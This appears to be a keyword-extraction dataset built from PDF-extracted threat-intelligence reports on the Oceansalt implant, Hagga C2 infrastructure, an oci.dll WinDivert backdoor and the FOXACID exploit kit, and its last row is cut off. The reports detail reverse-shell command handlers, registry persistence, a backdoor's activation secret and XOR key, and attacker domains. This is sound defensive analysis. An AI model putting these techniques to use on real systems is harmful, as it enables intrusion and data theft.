July 16–17 that are obfuscated and essentially the same implant, with minor changes such as the control servers. Some of the samples are missing reverse-shell functionality, indicating that this actor has access to Seasalt source code and can compile implants from the original source. This could demonstrate is a level of collaboration between two nation-states on their cyber offensive programs. Code Similarities with Seasalt Oceansalt contains the following strings that are part of Seasalt:■ Upfileer ■ Upfileok13‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 14. Seasalt strings appearing in Oceansalt.Figure 16. Command handler similarity between Seasalt, at left, and Oceansalt.Figure 15. Seasalt strings appearing in Oceansalt.Both implants have a high degree of similarity in code sharing and functions. A few of their commonalities follow. Command handler and index table similarities The command handler for both implants uses similar semantics and command codes to execute the same functionalities. Even the mechanism for calculating the command code is similar. Seasalt code is represented on the left and Oceansalt appears on the right:Figure 17. Command index table similarity between Seasalt, at left, and Oceansalt.Command and capability similarities Both implants execute their capabilities in the same way, which indicates they were both developed from the same code base. The response codes used by both implants to indicate the success or failure of the commands executed on the endpoint are also an exact match. Some of these similarities:■ Drive reconnaissance capability: Similar codesignatures. Both implants use the same codes to indicate the drive type to the control server.14‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 18. Similarity in the drive recon functionality. Seasalt is at left.15‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT■ File reconnaissance capability: Similar API and codeusage to get file information. The response codes sent to the control server to indicate whether a file was found is an exact match.Figure 19. Similarity in the command execution capability. Seasalt is at left.16‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT■ Reverse-shell creation capability: Both implants usesimilar code signatures to create a reverse shell on the infected endpoint. Both reverse shells are based on cmd.exe.Figure 20. Reverse-shell creation capability similarities. Seasalt is at left.17‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTCode Differences from Seasalt There are a few differences between the two implants in implementation; these demonstrate that Oceansalt is not simply a recompilation of Seasalt source code. However, these differences also provide evidence that Oceansalt is an evolution of Seasalt.■ Encoding: The Oceansalt implant uses an encoding and decoding mechanism before any data is sent to the control server. The Seasalt implant does not use this encoding and sends unencrypted data to the control server.■ Control server address: Oceansalt uses a hardcodedcontrol server address to establish communication. Seasalt parses the control address from its binary by decoding data.■ Persistence: Oceansalt has no persistencemechanisms to ensure continued infection over endpoint reboots. Seasalt, on the other hand, copies itself to C:\DOCUMEN~1\<userid>\java.exe and creates a registry entry to ensure infection after reboot: − HKLM\Software\Microsoft\Windows\currentVersion\Run | sysinfoBased on the executable header information, Seasalt was compiled on March 30, 2010. Oceansalt was compiled on June 1, 2018. Highlighting the compilation timestamps is important because, as our preceding analysis demonstrates, the samples have a high degree of code sharing:■ Multiple code matches and similarities ■ Multiple functional similarities ■ Identical command capabilities ■ Same command and response codes issued by andsent to the control serverThe code used to create the reverse shell in Oceansalt is an exact match with that of Comment Crew’s Seasalt implant. The mechanism for creating the reverse shell (pipe-based inter-process communication for standard I/O handles) is also seen in Comment Crew implants such as WebC2-CSON and WebC2-GREENCAT.These matches lead us to believe that Oceansalt is based on Seasalt, because it reuses much of the code base developed 10 years ago. Seasalt’s public disclosure in the Comment Crew report does not seem to have discouraged Oceansalt’s developer. Obfuscated Oceansalt Comparison with Seasalt We offer a comparative analysis of the following partially obfuscated implants against the initial Oceansalt sample and the Seasalt implant from Comment Crew.SHA-1 7/16/2018 7/17/2018 7/17/2018 7/16/2018 7/17/2018 7/17/2018 7/17/2018Role Partially obfuscated Oceansalt Partially obfuscated Oceansalt Partially obfuscated Oceansalt Partially obfuscated Oceansalt Partially obfuscated Oceansalt Partially obfuscated Oceansalt Partially obfuscated Oceansalt18‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTAll the partially obfuscated Oceansalt implants have the following characteristics:■ All implants were compiled during a three-day period:July 16–18■ All implants contain debug statements (print logs)written to the log file: C:\Users\Public\Videos\temp.log■ These debug statements begin with the timestampand consist of the following keywords at the beginning of the debug message: − [WinMain] the initial Oceansalt or Seasalt), some of the partially obfuscated implants are missing the reverse-shell capabilities:Partially Obfuscated Oceansalt Hash YesEvidence of Source-Code Sharing We present evidence of source-code sharing between the Oceansalt authors and Comment Crew, based on our comparative analysis of the three sets of samples: Oceansalt, partially obfuscated Oceansalt, and Seasalt.■ There is no possibility the attackers could have re-instrumented Seasalt by simply modifying the control server IP addresses: − The mechanism for obtaining the address in Seasaltis different from Oceansalt’s. Seasalt looks for encoded data at the end of the binary, decodes this data into tokens separated by the marker “$,” and obtains the control server information.− Oceansalt implants have the control server IPaddresses and port numbers hardcoded as plain- text strings in the binaries■ Some of the partially obfuscated Oceansalt implantsare missing the reverse-shell capability. All other capabilities (code signatures, response codes, etc.) and command codes are similar. (Command codes are either the same or off by 1.) Modifying capabilities in this fashion is possible only with access to the source code of Seasalt.19‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT■ The presence of debug strings tracing the code flow ofthe Oceansalt implants indicates they were compiled after adding debug information to the source code of Seasalt: − [WinMain]after recv cmd=%d 0Dh 0Ah − [WinMain]before recv 0Dh 0Ah − [FraudProc]Engine is still active! 0Dh 0Ah − [FraudPRoc]Process Restart! 0Dh 0Ah■ The presence of these debug strings also indicates that the authors who modified the source code may have used these samples to perform their initial testing before obfuscating and releasing the implants 1) contains a few key features that indicate compilation from the source code of Seasalt: − Does not contain the reverse-shell capability − Does not contain the drive recon capability − Loads API SHGetFileInfoA() dynamically withoutstatically importing it. This also suggests that Seasalt’s source code was modified before compilation.Figure 21. Dynamic API loading in an Oceansalt implant.20‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTOceansalt Capabilities Oceansalt is 76KB, a minimal on-disk footprint that is harder to detect than larger malware. The implant has a variety of capabilities for capturing data from the victim’s machine using a structured command system. From our research we have determined that this implant is a first-stage component. Further stages are downloaded through its commands. Oceansalt also supports commands enabling the attacker to take various actions on the victim’s system. Initial reconnaissance Oceansalt starts by trying to connect to its control server sends the following information about the endpoint:■ IP address ■ Computer name ■ File path of the implantAll data sent to the control server is encoded with a NOT operation on each byte.Figure 23. Control server connection functionality for Oceansalt.Figure 22. Initial data gathered from the endpoint by Oceansalt.21‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTCommand handler functions Oceansalt can execute 12 commands. Each command received from the control server is represented by a command code ranging from 0x0 to 0xB (0 to 11).Figure 24. Command index table showing Oceansalt’s capabilities.22‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 25. Oceansalt’s command execution functionality.23‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT0x0: Drive recon The control server sends this command code to Oceansalt to extract drive information from the endpoint. The format of the drive information: #<Drive _ letter>:<Drive _ type><Drive _ letter>:<Drive _ type> #Legend <Drive_letter><Drive_type>Description A,B,C,D,E, etc., representing all logical drives on 3 = DRIVE_REMOTE24‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupFigure 26. Oceansalt gathering drive information.REPORT0x1: File recon Sends the following information about a specific file (or file pattern) specified by the control server:■ Filename ■ Type of file on disk, for example, file or folder ■ “OK” if file was found on the location ■ File creation time in format <YYYY-mm-DD HH:MM:SS>0x3: File delete ■ Deletes a file specified by the control server from thedisk■ Once an operation is completed, the implant sends a “0” (in ASCII) to the control server to indicate the successful execution of the command■ If the operation fails, Oceansalt sends a “1” (in ASCII) toindicate failure0x2: Command execute Executes a command line using WinExec(). The command line is provided by the control server along with the command number. For example: <DWORD representing command number><command line to be executed> 02 00 00 00 C:\Windows\system32\calc.exe The command line is executed with a hidden window (using the SW_HIDE option for WinExec()).0x4: File write ■ Creates a file specified by a file path provided by the control server, which also provides the content to be written to the file path■ If the file write is successful, Oceansalt sends thekeyword “upfileok” indicating success■ If the file write fails, the implant sends the keyword“upfileer” indicating failureFigure 27. Oceansalt’s command execution capability.25‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT0x6: Process recon ■ Sends the name and ID for every process running onthe system to the control server■ Process data is sent via individual packets, that is, onepacket per processFigure 28. Oceansalt’s file-writing capability.Figure 29. Oceansalt’s process listing via its recon capability.26‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORT0x7: Process terminate ■ Terminates a process whose ID has been specified bythe control server0x8: Reverse shell create ■ Opens a reverse shell from the infected endpoint tothe control server using Windows pipes■ This reverse shell is based on cmd.exe. It can carry outfurther recon and make changes to the endpoint.27‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupFigure 30. Oceansalt’s reverse-shell creation capability.REPORT0x9: Reverse shell operate ■ Operates the reverse shell established using theprevious command code■ Contains the commands sent by the control server to the reverse shell that will be executed by cmd.exe on the infected endpoint■ Once the command has been executed, the output is read from cmd.exe via a pipe and sent to the control server0XA: Reverse shell terminate ■ Closes the reverse shell by closing handles to the pipescreated for the shell’s inter-process communication0XB: Connection test ■ Tests receive and send capabilities of the implant byreceiving data (0x7 bytes) from the control server and sending it back■ Persistence ■ Oceansalt has no persistence capabilities to remain onthe endpoint after the system reboots■ This lack suggests other components in the infectionchain may ensure persistence and carry out other malicious activitiesConclusion Based on our analysis, the McAfee Advanced Threat Research team has named this global threat Operation Oceansalt. This operation has focused on targets in South Korea and other countries with new malware that has roots in Comment Crew activity from 2010.Our research shows that Comment Crew’s malware in part lives on in different forms employed by another advanced persistent threat group operating primarily against South Korea. This research represents how threat actors including nation-states might collaborate on their campaigns. McAfee continues to monitor the threat landscape in Asia and around the world to track the evolution of known groups and changes to their techniques.28‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTMcAfee Coverage ■ Generic.dx!tjz ■ RDN/Generic.grp ■ RDN/Generic.ole ■ RDN/Generic.grp (trojan) ■ RDN/Trojan-FQBD ■ RDN/Generic.RPIndicators of Compromise MITRE ATT&CK™ Techniques ■ Scripting ■ Spear phishing attachment ■ Automated collection ■ Command-line interface ■ Network share discovery ■ Process discovery ■ File and directory discovery ■ Data from local system ■ Data from removable media ■ Data from network shared drive ■ Exfiltration over control server channelIP addresses McAfee is the device-to-cloud cybersecurity company. Inspired by the power of working together, McAfee creates business and consumer solutions that make our world a safer place. By building solutions that work with other companies’ products, McAfee helps businesses orchestrate cyber environments that are truly integrated, where protection, detection, and correction of threats happen simultaneously and collaboratively. By protecting consumers across all their devices, McAfee secures their digital lifestyle at home and away. By working with other security players, McAfee is leading the effort to unite against cybercriminals for the benefit of all.www.mcafee.com.About McAfee Labs and Advanced Threat Research McAfee Labs, led by McAfee Advanced Threat Research, is one of the world’s leading sources for threat research, threat intelligence, and cybersecurity thought leadership. With data from millions of sensors across key threats vectors—file, web, message, and network— McAfee Labs and McAfee Advanced Threat Research deliver real-time threat intelligence, critical analysis, and expert thinking to improve protection and reduce risks.www.mcafee.com/us/mcafee-labs.aspx.2821 Mission College Blvd. Santa Clara, CA 95054 888.847.8766 www.mcafee.comMcAfee and the McAfee logo are trademarks or registered trademarks of McAfee, LLC or its subsidiaries in the US and other countries. Other marks and brands may be claimed as the property of others. Copyright © 2017 McAfee, LLC. 4149_1018 OCTOBER 201830‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker Group ","{'phrases': ['Office documents', 'macros', 'Oceansalt', 'compromise', 'Server', 'Executes', 'B', 'control', 'Initial reconnaissance', 'victim', 'C2', 'commands', 'file', 'Process', 'data'], 'target': 'Office documents; macros; Oceansalt; compromise; Server; Executes; B; control; Initial reconnaissance; victim; C2; commands; file; Process; data.'}"
Spearphishing Email; emails; malicious attachments; links; malicious attachments; malware; persistence; the C2 server; HTTP requests; the attacker; commands; the C2 panel; IP; data; tools; DNS; detection; IP addresses.,"['1. Researchers started by analyzing a single IP address and C2 directory pattern associated with distributing Agent Tesla malware. 2. Passive DNS analysis of the initial IP revealed hosting of a C2 domain. 3. SSL certificate data tied the initial IP to other IPs hosting the same certificate. 4. C2 traffic patterns and Mana Tools login pages connected the IPs to Hagga infrastructure. 5. Open ports analysis indicated the C2s run on Windows servers likely using XAMPP web servers. 6. A backend MySQL server was identified, receiving traffic from the C2 IPs. 7. Continued monitoring of the MySQL server revealed new IPs contacting it, attributed to Hagga. 8. New Hagga C2 domains were identified through Passive DNS associations with the MySQL server. 9. Malbeacon telemetry ultimately tied activity back to IP addresses around Lahore, Pakistan. 10. Ongoing monitoring of the MySQL server enabled rapid discovery of new Hagga infrastructure. 11. Fingerprinting of SSL certificates and C2 patterns enabled attribution of new infrastructure to Hagga. ']","Extract the keywords: team-cymru.com /blog/2022/07/12/an-analysis-of-infrastructure-linked-to-the-hagga-threat-actor/ An Analysis of Infrastructure linked to the Hagga Threat Actor Kyle Krejci View all posts by Kyle Krejci ⋮ ⋮ 7/12/2022SummaryAs this research reveals, mapping out adversary infrastructure has distinct advantages that enable a proactive response to future threats. A well resourced team with access to the right tools can monitor changes to adversary infrastructure in real time, discoveries can become strategic advantages when fully exploited. This blog is geared towards the practitioner threat hunters and threat researchers, anyone reading this with the bottomline in mind should take a look at our economic study here first.IntroductionWe began tracking the threat actor Hagga in late 2021 following the release of an analysis by Z-Lab (Yoroi Security’s malware research team). Z-Lab were tracking a worldwide campaign to distribute the1/11Agent Tesla information stealer through an elusive multi-stage infection process. In their analysis, they common URL directory pattern for the identified C2 panels.This blog will describe how we were able to pivot in threat telemetry, using these IOCs as seeds, to identify several other C2s used by this threat actor, ultimately leading us to a backend MySQL server.Figure 1: C2 Panel IOCsKey ObservationsHagga infrastructure is hosted on dedicated leased infrastructure, largely on QuadraNet and Vietnam Posts and Telecommunications (VNPT). 01 November 2021 onwards. During the period 17 September – 17 December 2021, no further domains were hosted on this IP, indicating it was likely dedicated infrastructure (and not a compromised / shared host).Reviewing certificate data for this IP address identified an expired self-signed SSL certificate with a CN to communications with a single Hostinger IP address on TCP/3306 (the default port for MySQL servers). This activity occurred between 14 October – 17 December; occurring during the same time window as the Agent Tesla campaign identified by Z-Lab.Hostinger IP AddressNote: The Hostinger IP address is redacted throughout this report. As backend infrastructure, its identification would not provide any value to network defenders, and as explained below is likely also utilized for unconnected shared hosting purposes.Passive DNS data identified this IP as a web hosting control panel server. This is supported by open ports data identifying 16 TCP ports that are associated with Hostinger cPanel services. Namely, ports 21, 25, 80, 110, 143, 443, 465, 587, 993, 995, 2080, 2083, 2086, 2087, and 3306.Threat telemetry data for the Hostinger IP address identified inbound connections to TCP/3306 from numerous other IP addresses dating back to at least 17 September 2021. It was assessed that the IP was shared amongst other Hostinger clients, who were likely unconnected to malicious activities.3/11Figure 2: Hostinger MySQL ClientsHostinger MySQL ClientsConsidering the likelihood that the Hostinger IP was used in shared hosting, we needed to include additional constraints to limit our scope to data of relevance to the initial (and potentially other) C2s.We identified several HTTP requests to the original C2 IP address, with several ‘webpanel’ paths using a page.First reported in 2019 by Yoroi researchers, Mana Tools is a malware distribution and C2 panel that was created by the threat actor Hagga. It has been associated with several well-known malware variants, data) are hosted on QuadraNet infrastructure.5/11Figure 4: Hostinger MySQL Client RelationExamining open ports data for each of the above IPs, it appears that they are run on MS-Windows based operating systems. In addition to having standard Windows ports open, TCP/445, TCP/3389, and hosting IP for domain update.newbotv2[.]monster.Based on threat telemetry for communications with the Hostinger IP and timestamps for the Passive DNS resolutions, it appears that the threat actor “rebranded” the C2 domain from bot.statusupdate[.]one to newbotv4[.]monster around 13 October 2021.The X.509 CertificateIt was identified that the certificate (Figure 3) with the serial B5C752C98781B503 was a default certificate included with OpenSSL as part of an XAMPP installation. XAMPP is a free, open-source distribution that packages OpenSSL, MariaDB, PHP, and Perl with an Apache web server. Its primary use is for developers, allowing them to deploy a web server on a local server to test web applications without the need for an internet connection.Given that this certificate was installed on several systems hosting Mana Tools, it appeared that this threat actor was using XAMPP as the web server to host the Mana Tools C2 panel on Windows virtual6/11servers.Back to the Hostinger IPHaving identified the Hostinger IP as a common destination for MySQL traffic from several Hagga C2s, we needed to find more evidence to connect Hagga to the cPanel server. As stated earlier, given the possibility that the cPanel IP is shared amongst multiple Hostinger customers, this was difficult to achieve based on threat telemetry alone. To aid this process, we used insight derived from MalBeacon, in addition to further Passive DNS data.Note: MalBeacon is a revolutionary system that can attribute malware campaigns to the threat actor themselves through proprietary pixel tracking technology. If you haven’t heard of it before, I urge you to check it out.MalBeacon data identified several actor IPs in the vicinity of Lahore, Pakistan, associated with the C2s December 2021 and 03 December 2021. This activity aligned with the dates the IPs were associated with the Hagga C2s.We also identified resolutions in passive DNS data that connect the newbotv4.monster and statusupdate.one domains to Hostinger.7/11Table 4: Hostinger PDNS ResultsWhilst the response IP differed from the Hostinger IP address seen in the outbound TCP/3306 connections, it aligned with the processes of leasing a cPanel VPS with Hostinger.When a user purchases their cPanel account through Hostinger, they are asked to add the domain that they are seeking to host on the account to start the service. Once that domain is added, Hostinger assigns several default hostnames to the domain that resolve to a second IP address, which differs from the cPanel management IP first provided. These default hostnames are what are detailed in Table 4.The cPanel management IP can continue to be used for access to the web server control panel, or as an endpoint for a MySQL database.Continued Observation of Hostinger IPBy continuously monitoring threat telemetry for the Hostinger IP and examining X.509 certificates and URL requests for new MySQL clients, we were able to identify additional related C2 infrastructure within to enumerate associated activity. We subsequently identified several ‘new’ adversary IPs in the vicinity of Lahore, Pakistan. These IPs were observed in communications with the Hostinger IP during the same control server, it was possible to pivot and identify a backend server hosting a MySQL database operated by the threat actor Hagga. From this point a further pivot led us to the identification of additional C2s hosting the Mana Tools C2 panel along with a common certificate that can be used to increase mobibanewdan.duckdns.org mohbeebnew.duckdns.org mubbibun.duckdns.org cdec22.duckdns.org vncgoga.duckdns.org bakuzamokala.duckdns.org warnonmobina.duckdns.org abotherrdpajq.duckdns.org mobinomomuam.duckdns.org workflowstatus.live heavy-dutyindustry.shop microsoftiswear.duckdns.org update.newbotv4.monster newbotv4.monster bot.statusupdate.one11/11 ","{'phrases': ['Researchers', 'Passive DNS', 'data', 'traffic', 'Mana Tools', 'the IPs', 'Hagga infrastructure', 'ports', 'the C2s', 'XAMPP', 'a backend MySQL server', 'domains', 'Malbeacon', 'activity', 'IP addresses', 'Lahore', 'Pakistan', '10', '11'], 'target': 'Researchers; Passive DNS; data; traffic; Mana Tools; the IPs; Hagga infrastructure; ports; the C2s; XAMPP; a backend MySQL server; domains; Malbeacon; activity; IP addresses; Lahore; Pakistan; 10; 11.'}"
Avast; oci.dll; WinDivert; the attacker; IP; NTlib; C2; Command; the infected system; IP; VPN; communications; the infected system; IP; C2 servers; commands; data; addition; files; networks; proxy attacks; IPs.,"[' 1. The attackers compromised the network and installed the first backdoor file oci.dll. 2. oci.dll intercepted network traffic and allowed running arbitrary code received from the attacker. 3. Later, the second oci.dll replaced the first one to decrypt and run another malware component in memory. 4. The malware provided access to intercept and exfiltrate data, and install further backdoors. 5. Avast discovered the malware but was unable to get a response from the organization to investigate further. ']","Extract the keywords: Avast Finds Backdoor on US Government Commission Networkdecoded.avast.io/threatintel/avast-finds-backdoor-on-us-government-commission-networkDecember 16, 2021We have found a new targeted attack against a small, lesser-known U.S. federal government commission associated with international rights. Despite repeated attempts through multiple channels over the course of months to make them aware of and resolve this issue they would not engage.After initial communication directly to the affected organization, they would not respond, return communications or provide any information.The attempts to resolve this issue included repeated direct follow up outreach attempts to the organization. We also used other standard channels for reporting security issues directly to affected organizations and standard channels the United States Government has in place to receive reports like this.In these conversations and outreach we have received no follow up or information on whether the issues we reported have been resolved and no further information was shared with us.Because of the lack of discernible action or response, we are now releasing our findings to the community so they can be aware of this threat and take measures to protect their customers and the community. We are not naming the entity affected beyond this description.Because they would not engage with us, we have limited information about the attack. We are unable to attribute the attack, its impact, or duration. We are only able to describe two files we observed in the attack. In this blog, we are providing our analysis of these two files.While we have no information on the impact of this attack or the actions taken by the attackers, based on our analysis of the files in question, we believe it’s reasonable to conclude that the attackers were able to intercept and possibly exfiltrate all local network traffic in this organization. This could include information exchanged with other US government agencies and other international governmental and nongovernmental organizations (NGOs) focused on international rights. We also have indications that the attackers could run code of their choosing in the operating system’s context on infected systems, giving them complete control.Taken altogether, this attack could have given total visibility of the network and complete control of a system and thus could be used as the first step in a multi- stage attack to penetrate this, or other networks more deeply.Overview of the Two Files Found The first file masquerades as oci.dll and abuses WinDivert, a legitimate packet capturing utility, to listen to all internet communication. It allows the attacker to download and run any malicious code on the infected system. The main scope of this downloader may be to use priviliged local rights to overcome firewalls and network monitoring.The second file also masquerades as oci.dll, replacing the first file at a later stage of the attack and is a decryptor very similar to the one described by Trend Labs from Operation red signature. In the following text we present analysis of both of these files, describe the internet protocol used and demonstrate the running of any code on an infected machine.1/6First file – Downloader We found this first file disguised as oci.dll (“C:\Windows\System32\oci.dll”) (Oracle Call Interface). It contains a compressed library (let us call it NTlib ). This oci.dll exports only one function DllRegisterService . This function checks the MD5 of the hostname and stops if it doesn’t match the one it stores. This gives us two possibilities. Either the attacker knew the hostname of the targeted device in advance or the file was edited as part of the installation to run only on an infected machine to make dynamic analysis harder.We found two samples of this file:SHA256DescriptionE964E5C8A9DD307EBB5735406E471E89B0AAA760BA13C4DF1DF8939B2C07CB90 has no hash stored and it can run on every PCC1177C33195863339A17EBD61BA5A009343EDB3F3BDDFC00B45C5464E738E0A1is exactly the same file but it contains the hash of hostnameOci.dll then decompresses and loads NTlib and waits for the attacker to send a PE file, which is then executed.NTlib works as a layer between oci.dll and WinDivert .2/6The documentation for WinDivert describes it as “a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows 7, Windows 8 and Windows 10. WinDivert can be used to implement user-mode packet filters, packet sniffers, firewalls, NAT, VPNs, tunneling applications, etc., without the need to write kernel-mode code.”NTlib creates a higher level interface for TCP communication by using low-level IP packets oriented functions of WinDivert . The NTLib checks if the input has magic bytes 0x20160303 in a specific position of the structure given as the first argument as some sort of authentication.Exported functions of NTLib are:NTAccept3/6NTAcceptPWD NTGetPwdPacketThe names of the exported functions are self-explanatory. The only interesting function is NTAcceptPWD, which gets an activation secret as an argument and sniffs all the incoming TCP communication, searching for communication with that activation secret. It means that the malware itself does not open any port on its own, it uses the ports open by the system or other applications for its communication. The malicious communication is not reinjected to the Windows network stack, therefore the application listening on that port does not receive it and doesn’t even know some traffic to its port is being intercepted.The oci.dll uses NTlib to find communications with the activation secret CB 57 66 F7 43 6E 22 50 93 81 CA 60 5B 98 68 5C 89 66 F1 6B . While NTlib captures the activation secret, oci.dll responds with Locale (Windows GUID, OEM code page identifier and Thread Locale) and then waits for the encrypted PE file that exports SetNtApiFunctions. If the PE file is correctly decrypted, decompressed and loaded, it calls the newly obtained function SetNtApiFunctions.The ProtocolAs we mentioned before, the communication starts with the attacker sending CB 57 66 F7 43 6E 22 50 93 81 CA 60 5B 98 68 5C 89 66 F1 6B (the activation secret) over TCP to any open port of the infected machine.The response of the infected machine:Size of the of the message – 24 (value: 28) [4 B] Random encryption key 1 [4 B] Encrypted with Random encryption key 1 and precomputed key:0 [4 B] ThreadLocale [4 B] OEMCP or 0 [4 B] 0x20160814 (to test correctness of decryption) [4 B] 0,2,0,64,0,0,0 [each 4 B]The encryption is xor cipher with precomputed 256 B key:5C434846474C3F284EB64A4343433B4031E546C049584747454956FE4C51B369595AA5DB6DA082696E6C6D72654E74DC706969696166570B6CE66F7E6D6D6B6F7C24727That is xored with another 4 B key.After sending the above message the infected machine awaits for a following message with the encrypted PE file mentioned above:Size of the of the message – 24 [4 B] Random Encryption key 2 [4 B] Encrypted with Random encryption key 2 and precomputed key:6 (LZO level?) [4 B] 0 [8 B] 0x20160814 [4 B] 0x20160814 [4 B] Size of the whole message [4 B] Offset (0) [4 B] Length (Size of the whole message) [4 B] Encrypted with key 0x1415CCE and precomputed key:0 [16 B] Length of decompressed PE file [4 B] 0 [16 B] Length of decompressed PE file [4 B] 0 [16 B] LZO level 6 compressed PE fileWith the same encryption as the previous message.In our research we were unable to obtain the PE file that is part of this attack. In our analysis, we demonstrated the code execution capabilities by using a library with the following function:4/6We were able to start the calculator on an infected machine over the network with the following python script (link to GitHub).Second File – Decryptor The second file we found also masquerages as oci.dll . This file replaced the first downloader oci.dll and likely represents another, later stage of the same attack. The purpose of this file is to decrypt and run in memory the file “SecurityHealthServer.dll”.SHA256: 6C6B40A0B03011EEF925B5EB2725E0717CA04738A302935EAA6882A240C2229AWe found that this file is similar to the rcview40u.dll that was involved in Operation Red Signature. rcview40u.dll hacked update server. It decrypted a file named rcview40.log , that contained 9002 RAT and executed it in memory.This oci.dll exports same functions as rcview40u.dll :The new oci.dll decrypts SecurityHealthServer.dll with RC4 and used the string TSMSISRV.dll as the encryption key. This is similar to what we’ve seen with rcview40u.dll which also uses RC4 to decrypt rcview.log with the string kernel32.dll as the encryption key.Because of the similarities between this oci.dll and rcview40u.dll , we believe it is likely that the attacker had access to the source code of the three year- old rcview40u.dll . The newer oci.dll has minor changes like starting the decrypted file in a new thread instead of in a function call which is what rcview40u.dll does. oci.dll was also compiled for x86-64 architecture while rcview40u.dll was only compiled for x86 architecture.Conclusion While we only have parts of the attack puzzle, we can see that the attackers against these systems were able to compromise systems on the network in a way that enabled them to run code as the operating system and capture any network traffic travelling to and from the infected system.5/6We also see evidence that this attack was carried out in at least two stages, as shown by the two different versions of oci.dll we found and analyzed.The second version of the oci.dll shows several markers in common with rcview40u.dll that was used in Operation Red Signature such that we believe these attackers had access to the source code of the malware used in that attack.Because the affected organization would not engage we do not have any more factual information about this attack. It is reasonable to presume that some form of data gathering and exfiltration of network traffic happened, but that is informed speculation. Further because this could have given total visibility of the network and complete control of an infected system it is further reasonable speculation that this could be the first step in a multi-stage attack to penetrate this, or other networks more deeply in a classic APT-type operation.That said, we have no way to know for sure the size and scope of this attack beyond what we’ve seen. The lack of responsiveness is unprecedented and cause for concern. Other government and non-government agencies focused on international rights should use the IoCs we are providing to check their networks to see if they may be impacted by this attack as well.6/6 ","{'phrases': ['the attackers', 'the network', 'first', 'oci.dll', 'network traffic', 'code', 'second', 'place', 'decrypt', 'memory', 'the malware', 'access', 'Avast', 'response', 'the organization'], 'target': 'the attackers; the network; first; oci.dll; network traffic; code; second; place; decrypt; memory; the malware; access; Avast; response; the organization.'}"
reconnaissance; targets; zero-day vulnerabilities; reconnaissance; vulnerabilities; Zero-Day; RCE; 10; persistent payloads; exploitation; arbitrary commands; control; lateral movement; XSS; a backdoor; payloads; persistence; IP.,"["" 1. The NSA's TAO group performs reconnaissance on potential targets. 2. Targets are filtered based on vulnerability, then sessions are hijacked via MITM attacks. 3. FOXACID scans the target system and chooses the optimal exploit. 4. Shellcode is injected to deliver the spyware payload. 5. If the exploit succeeds, FOXACID installs persistent malware based on the target's value. 6. Implants like SECONDDATE and Validator enable long-term monitoring and data exfiltration. 7. Wrappers like DireScallop ensure malware persistence even with protections like DeepFreeze. 8. TAO manages FOXACID operations via a web-based Project Tracker interface. 9. Infrastructure consists of regional servers for spam, MITM attacks, and post-exploitation. 10. Custom filters tailor each stage of the attack chain based on reconnaissance data. ""]","Extract the keywords: National Computer Virus Emergency Response CenterTechnical Analysis on FOXACID— A U.S. NSA-linked Cyber-Weapon Jun. 29th, 2022Executive summary National Computer Virus Emergency Response Center (CVERC) has made technical analysis on an Exploit-Kit named FOXACID platform, which has been used as main infrastructure of Computer Network Exploitation (CNE) Operation by the Office of Tailored Access Operations (TAO, affiliated with U.S. NSA). Recently, artifacts of a malware family called “Validator” were discovered from several institutions of research located in China. A further analysis showed that the “Validator” is a backdoor known to have been used by TAO and as a default payload FOXACID platform is an Exploit-Kit which support MITMA (Man-in-The-Middle-Attack), session hijacking, reconnaissance, automatic-exploitation and payload-delivery. With the help of FOXACID, TAO could compromise and get initial access of the victim’s internal network, take lateral-movement, and finally deploy trojans and backdoors for persistence. FOXACID platform was designed and build in distributed architecture with multiple servers which categorized by their functions (SPAM, MITMA, Post-Exploitation, etc.) and targets (China, Russia, etc.). FOXACID platform is normally integrated with other NSA-linked weapons such as QUANTUM and SECONDATE, it will exploit the targets via XSS alongside the MITMA and the malicious scripts might come from single or multiple FOXACID servers. FOXACID has a collection of Zero- Day RCE vulnerabilities for widely-used internet browsers, such as Microsoft Internet Explorer, Mozilla FireFox, Apple Safari, Android Webkit, etc. At first, the CNE team of TAO take reconnaissance on targets with information-leak vulnerabilities. Then, based on result of reconnaissance, target will be exploited via known-vulnerabilities. For well-patched valuable targets, Zero-Day vulnerabilities will be used. Finally, spywares will be delivered for persistent remote control, monitoring and data exfiltration. Architecture FOXACID server AKA “FA Server” is the vital infrastructure of FOXACID platform for target selection, exploitation, and payload deployment, which is set up on IIS within standalone Microsoft Windows 2003 Server. As far as we known, FOXACID is targeting OS for desktop PCTechnical Analysis on FOXACID1National Computer Virus Emergency Response Centerincluding Windows, Linux, Solaris, Macintosh and OS for mobile devices such as Windows Phone, iOS and Android. CDR is the method of data transfer used by FA Severs, which is a private data-encryption protocol used by NSA. FA servers are deployed in distribution structure, data on the low side is transferred in an encrypted format to high side. Then data will be decrypted and placed in its appropriated file location on the server. Data could be retrieved by Foxsearch, which is an intelligence search engine. FA server consisted mainly of three components, includes basic server-side software based on Perl scripts, plugins and payloads. Attack Scenario CNE team use FOXACID as a weapon for implant with no interaction during a MITMA. Following steps will be proceed:Step 1: ReconnaissanceWhen victims’ sessions were hijacked and redirected, plugin for information gathering is activated and collect the necessary data of target-hosts’ running state.Step 2: Exploitation selectionDecides adaptive exploitation for targets based on reconnaissance, 